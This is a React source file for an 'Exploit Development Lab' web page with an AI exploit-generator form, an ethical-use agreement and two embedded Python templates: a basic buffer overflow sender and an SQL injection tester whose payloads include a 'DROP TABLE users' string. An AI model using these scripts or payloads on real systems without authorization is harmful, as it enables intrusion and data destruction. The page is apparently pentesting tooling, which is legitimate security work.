import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { useQuery, useMutation } from "@tanstack/react-query";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { 
  Code, 
  Play, 
  Shield, 
  AlertTriangle, 
  Download, 
  Save, 
  FileCode, 
  Target,
  Brain,
  Zap,
  Lock,
  CheckCircle
} from "lucide-react";

interface ExploitTemplate {
  id: string;
  name: string;
  type: string;
  platform: string;
  difficulty: string;
  description: string;
  code: string;
}

interface ExploitProject {
  id: string;
  name: string;
  vulnerabilityType: string;
  targetPlatform: string;
  code: string;
  status: string;
  createdAt: string;
}

export default function ExploitDevelopment() {
  const [selectedTemplate, setSelectedTemplate] = useState<string>("");
  const [exploitCode, setExploitCode] = useState<string>("");
  const [projectName, setProjectName] = useState<string>("");
  const [targetPlatform, setTargetPlatform] = useState<string>("");
  const [vulnerabilityType, setVulnerabilityType] = useState<string>("");
  const [ethicalAgreement, setEthicalAgreement] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<string>("builder");
  
  const { toast } = useToast();

  // Mock data for development - will be replaced with real API calls
  const exploitTemplates: ExploitTemplate[] = [
    {
      id: "1",
      name: "Buffer Overflow Basic",
      type: "Memory Corruption",
      platform: "Linux",
      difficulty: "Beginner",
      description: "Basic stack-based buffer overflow exploit template",
      code: `#!/usr/bin/env python3
import struct
import socket

# Target configuration
target_host = "127.0.0.1"
target_port = 9999

# Payload configuration
offset = 146
eip_control = b"BBBB"
shellcode = b"\\x90" * 32  # NOP sled

# Construct exploit
payload = b"A" * offset + eip_control + shellcode

# Send exploit
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))
    s.send(payload)
    s.close()
    print("[+] Exploit sent successfully")
except Exception as e:
    print(f"[-] Error: {e}")
`
    },
    {
      id: "2", 
      name: "SQL Injection PoC",
      type: "Web Application",
      platform: "Web",
      difficulty: "Intermediate",
      description: "SQL injection proof-of-concept for database extraction",
      code: `#!/usr/bin/env python3
import requests
import time
import string

# Target configuration
target_url = "http://example.com/login.php"
injection_param = "username"

# SQL injection payload
def test_injection(payload):
    data = {
        injection_param: payload,
        "password": "test"
    }
    
    try:
        response = requests.post(target_url, data=data, timeout=5)
        return response
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

# Test for basic SQL injection
basic_payloads = [
    "' OR '1'='1",
    "' UNION SELECT 1,2,3--",
    "'; DROP TABLE users;--"
]

print("[*] Testing SQL injection vectors...")
for payload in basic_payloads:
    print(f"[*] Testing: {payload}")
    response = test_injection(payload)
    if response and "error" not in response.text.lower():
        print("[+] Potential SQL injection found!")
        break
    time.sleep(1)
`
    }
  ];

  const generateExploitMutation = useMutation({
    mutationFn: async (data: {
      vulnerabilityType: string;
      targetPlatform: string;
      description: string;
    }) => {
      return apiRequest("/api/exploits/generate", "POST", data);
    },
    onSuccess: (data: any) => {
      setExploitCode(data.code || "");
      toast({
        title: "Exploit Generated",
        description: "AI-powered exploit code has been generated successfully.",
      });
    },
    onError: (error) => {
      toast({
        title: "Generation Failed",
        description: "Failed to generate exploit code. Please try again.",
        variant: "destructive",
      });
    },
  });

  const saveProjectMutation = useMutation({
    mutationFn: async (data: {
      name: string;
      vulnerabilityType: string;
      targetPlatform: string;
      code: string;
    }) => {
      return apiRequest("/api/exploits/projects", "POST", data);
    },
    onSuccess: () => {
      toast({
        title: "Project Saved",
        description: "Exploit project has been saved successfully.",
      });
      queryClient.invalidateQueries({ queryKey: ["/api/exploits/projects"] });
    },
  });

  const handleGenerateExploit = () => {
    if (!vulnerabilityType || !targetPlatform) {
      toast({
        title: "Missing Information",
        description: "Please select vulnerability type and target platform.",
        variant: "destructive",
      });
      return;
    }

    if (!ethicalAgreement) {
      toast({
        title: "Ethical Agreement Required",
        description: "You must agree to ethical use guidelines before generating exploits.",
        variant: "destructive",
      });
      return;
    }

    generateExploitMutation.mutate({
      vulnerabilityType,
      targetPlatform,
      description: `Generate exploit for ${vulnerabilityType} on ${targetPlatform}`
    });
  };

  const handleSaveProject = () => {
    if (!projectName || !exploitCode) {
      toast({
        title: "Missing Information",
        description: "Please provide project name and exploit code.",
        variant: "destructive",
      });
      return;
    }

    saveProjectMutation.mutate({
      name: projectName,
      vulnerabilityType,
      targetPlatform,
      code: exploitCode
    });
  };

  const handleTemplateSelect = (templateId: string) => {
    const template = exploitTemplates.find(t => t.id === templateId);
    if (template) {
      setExploitCode(template.code);
      setVulnerabilityType(template.type);
      setTargetPlatform(template.platform);
      setSelectedTemplate(templateId);
    }
  };

  return (
    <div className="min-h-screen bg-dark-900 text-white">
      {/* Header */}
      <header className="bg-dark-800 border-b border-dark-700 px-6 py-4">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
              <Code className="text-primary" size={24} />
              Exploit Development Lab
            </h1>
            <p className="text-dark-300 mt-1">Professional exploit development and testing environment</p>
          </div>
          <div className="flex items-center space-x-4">
            <Badge variant="outline" className="border-red-500 text-red-400">
              <Shield size={14} className="mr-1" />
              Authorized Use Only
            </Badge>
          </div>
        </div>
      </header>

      {/* Ethical Agreement Modal */}
      {!ethicalAgreement && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <Card className="bg-dark-800 border-dark-700 max-w-md mx-4">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <AlertTriangle className="text-yellow-500" size={20} />
                Ethical Use Agreement
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <p className="text-dark-300 text-sm">
                  By proceeding, you acknowledge and agree to:
                </p>
                <ul className="text-dark-300 text-sm space-y-2 list-disc list-inside">
                  <li>Use exploits only on systems you own or have explicit authorization to test</li>
                  <li>Comply with all applicable laws and regulations</li>
                  <li>Follow responsible disclosure practices</li>
                  <li>Not use these tools for malicious purposes</li>
                  <li>Maintain comprehensive audit logs of all activities</li>
                </ul>
                <div className="flex justify-end space-x-2">
                  <Button
                    variant="outline"
                    onClick={() => window.history.back()}
                    className="border-dark-600"
                  >
                    Cancel
                  </Button>
                  <Button
                    onClick={() => setEthicalAgreement(true)}
                    className="bg-primary hover:bg-primary/90"
                  >
                    I Agree
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Main Content */}
      <main className="p-6">
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="bg-dark-800 border-dark-700">
            <TabsTrigger value="builder" className="data-[state=active]:bg-dark-700">
              <FileCode size={16} className="mr-2" />
              Exploit Builder
            </TabsTrigger>
            <TabsTrigger value="templates" className="data-[state=active]:bg-dark-700">
              <Target size={16} className="mr-2" />
              Templates
            </TabsTrigger>
            <TabsTrigger value="projects" className="data-[state=active]:bg-dark-700">
              <Save size={16} className="mr-2" />
              Projects
            </TabsTrigger>
          </TabsList>

          <TabsContent value="builder" className="mt-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Configuration Panel */}
              <Card className="bg-dark-800 border-dark-700">
                <CardHeader>
                  <CardTitle className="text-white flex items-center gap-2">
                    <Brain className="text-primary" size={20} />
                    AI Exploit Generator
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label className="text-dark-300">Project Name</Label>
                    <Input
                      value={projectName}
                      onChange={(e) => setProjectName(e.target.value)}
                      placeholder="My Exploit Project"
                      className="bg-dark-700 border-dark-600 text-white"
                      data-testid="input-project-name"
                    />
                  </div>
                  
                  <div>
                    <Label className="text-dark-300">Vulnerability Type</Label>
                    <Select value={vulnerabilityType} onValueChange={setVulnerabilityType}>
                      <SelectTrigger className="bg-dark-700 border-dark-600 text-white" data-testid="select-vulnerability-type">
                        <SelectValue placeholder="Select vulnerability type" />
                      </SelectTrigger>
                      <SelectContent className="bg-dark-700 border-dark-600">
                        <SelectItem value="buffer-overflow">Buffer Overflow</SelectItem>
                        <SelectItem value="sql-injection">SQL Injection</SelectItem>
                        <SelectItem value="xss">Cross-Site Scripting</SelectItem>
                        <SelectItem value="rce">Remote Code Execution</SelectItem>
                        <SelectItem value="privilege-escalation">Privilege Escalation</SelectItem>
                        <SelectItem value="path-traversal">Path Traversal</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label className="text-dark-300">Target Platform</Label>
                    <Select value={targetPlatform} onValueChange={setTargetPlatform}>
                      <SelectTrigger className="bg-dark-700 border-dark-600 text-white" data-testid="select-target-platform">
                        <SelectValue placeholder="Select target platform" />
                      </SelectTrigger>
                      <SelectContent className="bg-dark-700 border-dark-600">
                        <SelectItem value="linux">Linux</SelectItem>
                        <SelectItem value="windows">Windows</SelectItem>
                        <SelectItem value="macos">macOS</SelectItem>
                        <SelectItem value="web">Web Application</SelectItem>
                        <SelectItem value="android">Android</SelectItem>
                        <SelectItem value="ios">iOS</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <Separator className="bg-dark-600" />

                  <div className="space-y-2">
                    <Button
                      onClick={handleGenerateExploit}
                      disabled={generateExploitMutation.isPending}
                      className="w-full bg-primary hover:bg-primary/90"
                      data-testid="button-generate-exploit"
                    >
                      <Zap size={16} className="mr-2" />
                      {generateExploitMutation.isPending ? "Generating..." : "Generate Exploit"}
                    </Button>
                    
                    <Button
                      onClick={handleSaveProject}
                      disabled={saveProjectMutation.isPending || !exploitCode}
                      variant="outline"
                      className="w-full border-dark-600"
                      data-testid="button-save-project"
                    >
                      <Save size={16} className="mr-2" />
                      Save Project
                    </Button>
                  </div>
                </CardContent>
              </Card>

              {/* Code Editor */}
              <div className="lg:col-span-2">
                <Card className="bg-dark-800 border-dark-700 h-full">
                  <CardHeader>
                    <div className="flex items-center justify-between">
                      <CardTitle className="text-white flex items-center gap-2">
                        <Code className="text-primary" size={20} />
                        Exploit Code
                      </CardTitle>
                      <div className="flex items-center space-x-2">
                        <Button size="sm" variant="outline" className="border-dark-600">
                          <Download size={14} className="mr-1" />
                          Export
                        </Button>
                        <Button size="sm" variant="outline" className="border-dark-600">
                          <Play size={14} className="mr-1" />
                          Test
                        </Button>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <Textarea
                      value={exploitCode}
                      onChange={(e) => setExploitCode(e.target.value)}
                      placeholder="// Exploit code will appear here after generation
// or you can write your own exploit code

import socket
import struct

# Your exploit code here..."
                      className="min-h-[500px] bg-dark-900 border-dark-600 text-white font-mono text-sm"
                      data-testid="textarea-exploit-code"
                    />
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="templates" className="mt-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {exploitTemplates.map((template) => (
                <Card key={template.id} className="bg-dark-800 border-dark-700">
                  <CardHeader>
                    <CardTitle className="text-white text-lg">{template.name}</CardTitle>
                    <div className="flex items-center space-x-2">
                      <Badge variant="outline" className="border-primary text-primary">
                        {template.type}
                      </Badge>
                      <Badge variant="outline" className="border-blue-500 text-blue-400">
                        {template.platform}
                      </Badge>
                      <Badge variant="outline" className="border-yellow-500 text-yellow-400">
                        {template.difficulty}
                      </Badge>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <p className="text-dark-300 text-sm mb-4">{template.description}</p>
                    <Button
                      onClick={() => handleTemplateSelect(template.id)}
                      className="w-full bg-primary hover:bg-primary/90"
                      data-testid={`button-select-template-${template.id}`}
                    >
                      Use Template
                    </Button>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          <TabsContent value="projects" className="mt-6">
            <Card className="bg-dark-800 border-dark-700">
              <CardHeader>
                <CardTitle className="text-white">Your Exploit Projects</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-dark-300">No saved projects yet. Create your first exploit project using the builder.</p>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  );
}